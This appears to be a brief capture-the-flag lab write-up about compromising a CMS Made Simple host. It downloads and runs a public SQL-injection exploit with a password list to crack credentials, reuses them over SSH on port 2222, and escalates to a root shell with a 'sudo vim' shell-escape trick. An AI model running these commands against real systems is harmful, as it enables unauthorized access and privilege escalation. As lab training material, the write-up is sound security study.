- We find a page using CMS made simple that has a cve. We can try this [exploit](https://www.exploit-db.com/exploits/46635)
- We take it in our kali `wget https://www.exploit-db.com/download/46635`
- `python 46635 -u http://10.10.61.2/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`

- Once the credentials found we can login here http://10.10.61.2/simple/admin/login.php

- **But** we can also try to check if the creds would work with ssh (Remember to specify the port in your ssh command because it is not on default 22 port)
- `ssh mitch@10.10.104.30 -p 2222`

## Privesc

- `sudo -l` we find out that vim is allowed
- We can do this trick [here](https://gtfobins.github.io/gtfobins/vim/#sudo) `sudo vim -c ':!/bin/bash'` I just changed it to get a bash shell
- It works
